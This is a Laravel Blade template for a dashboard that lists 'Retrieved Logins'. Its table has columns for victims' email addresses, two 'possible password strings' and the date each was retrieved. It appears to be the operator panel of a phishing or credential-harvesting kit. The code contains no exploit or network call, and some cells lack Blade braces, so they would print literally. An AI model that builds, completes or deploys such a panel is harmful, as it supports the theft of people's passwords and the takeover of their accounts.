@extends('layout')

@section('page-title', "Dashboard")

@section('content')
      <!-- Icon Cards-->
      <div class="row">
        <div class="col-xl-3 col-sm-6 mb-3">
          <div class="card text-white bg-success o-hidden h-100">
            <div class="card-body">
              <div class="card-body-icon">
                <i class="fa fa-fw fa-shopping-cart"></i>
              </div>
              <div class="mr-5">{{$x}} New Entries!</div>
            </div>
            <a class="card-footer text-white clearfix small z-1" href="#">
              <span class="float-left">View Details</span>
              <span class="float-right">
                <i class="fa fa-angle-right"></i>
              </span>
            </a>
          </div>
        </div>
      </div>
      <div class="row">
      	<div class="col-md-12">
      	 <!-- Example DataTables Card-->
      <div class="card mb-3">
        <div class="card-header">
          <i class="fa fa-table"></i> Retrieved Logins</div>
        <div class="card-body">
          <div class="table-responsive">
            <table class="table table-bordered" id="dataTable" width="100%" cellspacing="0">
              <thead>
                <tr>
                  <th>SN</th>
                  <th>Email</th>
                  <th>Possible Password String #1</th>
                  <th>Possible Password String #2</th>
                  <th>Date Retrieved</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tfoot>
                <tr>
                  <th>SN</th>
                  <th>Email</th>
                  <th>Possible Password String #1</th>
                  <th>Possible Password String #2</th>
                  <th>Date Retrieved</th>
                  <th>Action</th>
                </tr>
              </tfoot>
              <tbody>
              @if(isset($latest))
              @foreach($latest as $l)
                <tr>
                  <td>$l->sn</td>
                  <td>$l->email</td>
                  <td>$l->s_1</td>
                  <td>$l->s_2</td>
                  <td>$l->created_at->format("js F, Y")</td>
                  <td><button class="btn btn-danger">Delete</button></td>
                </tr>
                <tr>
                @endforeach
                @endif
              </tbody>
            </table>
          </div>
        </div>
        <div class="card-footer small text-muted">Updated yesterday at 11:59 PM</div>
      </div>
          </div>
      </div>
@stop